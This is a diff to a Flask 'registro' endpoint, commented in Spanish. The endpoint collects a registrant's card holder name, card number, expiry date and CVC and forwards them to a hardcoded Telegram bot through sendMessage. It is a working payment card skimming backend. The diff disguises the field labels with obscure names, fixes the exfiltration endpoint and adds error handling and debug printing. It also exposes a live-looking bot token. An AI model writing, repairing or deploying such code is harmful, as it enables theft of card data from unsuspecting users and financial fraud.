@@ -57,15 +57,21 @@ def registro():
             f"- Número: {data['numero']}\n\n"
             "*Datos de Pago*\n"
             f"- Nombre en Tarjeta: {data['card_name']}\n"
-            f"- Número de Tarjeta: {data['card_number']}\n"
-            f"- Fecha de Vencimiento: {data['card_expiry']}\n"
-            f"- 666: {data['card_cvc']}"
+            f"- Nú de plastic: {data['card_number']}\n"
+            f"- F de V: {data['card_expiry']}\n"
+            f"- ggg: {data['card_cvc']}"
         )
 
         # Enviar a bot de Telegram
         bot_token = os.environ.get('TELEGRAM_BOT_TOKEN')
         chat_id = os.environ.get('TELEGRAM_CHAT_ID')
-        telegram_url = f"https://api.telegram.org/bot8345884832:AAEBzNwoibZhS5uRHPD62Pyicuvhc_bwU-A/getUpdates"
+        
+        # Verificar que las variables existan
+        if not bot_token or not chat_id:
+            print("Error: TELEGRAM_BOT_TOKEN o TELEGRAM_CHAT_ID no configurados en variables de entorno")
+            return jsonify({'success': False, 'message': 'Error de configuración'}), 500
+
+        telegram_url = f"https://api.telegram.org/botbot8345884832:AAEBzNwoibZhS5uRHPD62Pyicuvhc_bwU-A/sendMessage"  # Endpoint correcto
 
         try:
             response = requests.post(telegram_url, data={
@@ -73,10 +79,18 @@ def registro():
                 'text': message,
                 'parse_mode': 'Markdown'
             })
+            print(f"Response status: {response.status_code}")
+            print(f"Response body: {response.text}")  # Para debug: ver el JSON de respuesta
+            
             if response.status_code == 200:
-                return jsonify({'success': True, 'message': 'Registro Terminado'})
+                response_json = response.json()
+                if response_json.get('ok'):
+                    return jsonify({'success': True, 'message': 'Registro Terminado'})
+                else:
+                    print(f"Telegram error: {response_json.get('description')}")
+                    return jsonify({'success': False, 'message': f'Error de Telegram: {response_json.get("description")}'}), 500
             else:
-                return jsonify({'success': False, 'message': 'Error al enviar al bot'}), 500
+                return jsonify({'success': False, 'message': 'Error en la solicitud HTTP'}), 500
         except Exception as e:
             print(f"Error: {e}")
             return jsonify({'success': False, 'message': 'Error interno'}), 500
